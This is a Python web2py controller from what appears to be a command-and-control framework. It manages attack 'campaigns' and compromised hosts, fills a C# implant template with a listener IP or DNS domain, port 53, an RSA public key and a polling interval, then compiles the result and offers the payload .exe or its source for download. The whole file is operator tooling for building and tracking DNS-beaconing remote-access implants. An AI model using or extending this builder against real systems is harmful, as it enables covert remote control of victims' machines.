# -*- coding: utf-8 -*-
import os
import platform
import psutil
from gluon.contenttype import contenttype
import base64
from Cryptodome import Random
from Cryptodome.PublicKey import RSA
from Cryptodome.Util import number
from subprocess import Popen, PIPE, STDOUT
from netifaces import interfaces, ifaddresses, AF_INET


@auth.requires_login()
def index():
    db.campaign.timestamp.default=request.now
    form=SQLFORM(db.campaign).process()
    if form.accepts(request, session):
        redirect(URL('show',args=1))
    rows=db(db.campaign).select()
    is_server_running=check_server()
    return locals()

@auth.requires_login()
def show():
    session.campaign_id=request.args(0,cast=int)
    error_message=session.error_message
    session.error_message=""
    campaign=db(db.campaign.id==session.campaign_id).select().first()
    if (campaign is not None):
        details_id=None
        details=db(db.campaign_details.campaign_id==session.campaign_id).select(db.campaign_details.id).first()
        if (details is not None):
            details_id=details.id
        db.campaign_details.campaign_id.default=request.args(0,cast=int)
        campaign_details=db.campaign_details(details_id)
        details_form=SQLFORM(db.campaign_details,campaign_details,showid=False,submit_button="Submit Campaign Details",_id='detailsform')
        db.payload_details.campaign_id.default=request.args(0,cast=int)
        payload=db(db.payload_details.campaign_id==session.campaign_id).select().first()
        payload_form=SQLFORM(db.payload_details,payload,showid=False,_id='payloadform',submit_button="Submit Polling Interval")
        campaign_hosts=db(db.hosts.campaign_id==session.campaign_id).select(db.hosts.name,db.hosts.id,db.hosts.terminated)
        unassigned_hosts=db(db.hosts.campaign_id==0).select(db.hosts.name,db.hosts.id,db.hosts.terminated)
        if details_form.process().accepted:
            redirect(URL('show',args=session.campaign_id))
        if payload_form.process().accepted:
            redirect(URL('show',args=session.campaign_id))
        ##CHECK IF A SERVER IS RUNNING##
        is_server_running=check_server()
        return locals()
    else:
        redirect(URL('index'))


@auth.requires_login()
def download_exe():
    if (prepare_source()==1):
        session.error_message="Submit the campaign details and polling interval first"
        redirect(URL('show',args=session.campaign_id))
    else:
        filename='payload_'+str(session.campaign_id)
        outPath=os.path.join(request.folder, 'private',filename+'.cs')
        exePath=os.path.join(request.folder, 'private',filename+'.exe')
        if (os.path.isfile(exePath)):
            try:
                os.remove(exePath)
            except:
                pass
        if (platform.system()=='Linux'):
            server_process=Popen(["mcs",outPath,"-out:"+exePath])
        if (platform.system()=='Windows'):
            mcs_path=db(db.settings.name=="WIN_MCS_PATH").select(db.settings.value).first().value
            server_process=Popen(["mcs_path",outPath,"-out:"+exePath])
        try:
            o, session.error_message = server_process.communicate(timeout=60)
        finally:
            if (os.path.isfile(exePath)):
                response.headers['Content-Type'] = contenttype("exe")
                response.headers['Content-disposition'] = 'attachment; filename=%s' % filename+".exe"
                res = response.stream(open(exePath, "rb"), chunk_size=4096)
                return res
            else:
                redirect(URL('show',args=session.campaign_id))

@auth.requires_login()
def download_source():
    prepare_source()
    filename='payload_'+str(session.campaign_id)
    outPath=os.path.join(request.folder, 'private',filename+'.cs')
    if (os.path.isfile(outPath)):
        response.headers['Content-Type'] = contenttype("cs")
        response.headers['Content-disposition'] = 'attachment; filename=%s' % filename+".cs"
        res = response.stream(open(outPath, "rb"), chunk_size=4096)
        return res
    else:
        redirect(URL('show',args=session.campaign_id))

def prepare_source():
    serverIP=""
    domain=""
    details=db(db.campaign_details.campaign_id==session.campaign_id).select().first()
    server=db(db.server.id==1).select().first()
    if server is None:
        db.server.insert()
        server=db(db.server.id==1).select().first()
    if (details is not None):
        payload=db(db.payload_details.campaign_id==session.campaign_id).select().first()
        if (payload is not None):
            mode=details.connection_type
            polling=payload.polling_interval
            if (mode=="D"):
                recursive="false"
                if (server is not None):
                    serverIP=server.custom_listening_ip
                    if serverIP is None:
                        serverIP=server.listening_ip
                        if ((serverIP is None) or (serverIP=="Custom IP")):
                            session.error_message="Please specify the server IP address first"
                            redirect(URL('server','index'))
            if (mode=="R"):
                recursive="true"
                domain=details.server_domain
                if (domain is None):
                    session.error_message="You need to specify the authoritative DNS domain of the server for the payload to work"
                    redirect(URL('show',args=session.campaign_id))
            key=server.privkey
            if (key is None):
                pkey=RSA.generate(4096,Random.new().read)
                key=pkey.exportKey('PEM')
                db(db.server).update(privkey=key)
            server=db(db.server).select().first()
            key=server.privkey
            pkey=RSA.import_key(key)
            db(db.campaign_details).update(keye=str(base64.b64encode(number.long_to_bytes(pkey.publickey().e))))
            db(db.campaign_details).update(keyn=str(base64.b64encode(number.long_to_bytes(pkey.publickey().n))))
            details=db(db.campaign_details.campaign_id==session.campaign_id).select().first()
            pubkeye=details.keye.replace("'","")[1:]
            pubkeyn=details.keyn.replace("'","")[1:]
            filename='payload_'+str(session.campaign_id)
            inPath=os.path.join(request.folder, 'private', 'Implant.cs')
            outPath=os.path.join(request.folder, 'private',filename+'.cs')
            if (os.path.isfile(outPath)):
                try:
                    os.remove(outPath)
                except:
                    pass
            infile = open(inPath)
            outfile= open(outPath,'w+')
            newcs=""
            for line in infile:
                newline=line.replace("%%RECURVISE_MODE%%",recursive).replace("%%IP_ADDRESS%%",'"'+serverIP+'"').replace("%%PORT%%","53").replace(" %%DOMAIN%%",'"'+domain+'"').replace("%%MODULUS%%",pubkeyn).replace("%%EXPONENT%%",pubkeye).replace("%%POLLING_INTERVAL%%",str(polling))
                outfile.write(newline)
            infile.close()
            outfile.close()
            return 0
        else:
            return 1
    else:
        return 1
def check_server():
    is_server_running=False
    pid=db(db.server).select(db.server.server_PID).first()
    if (pid is not None):
        server_pid=int(pid.server_PID)
        if (server_pid>0):
            if (psutil.pid_exists(int(server_pid))):
                is_server_running=True
    return is_server_running
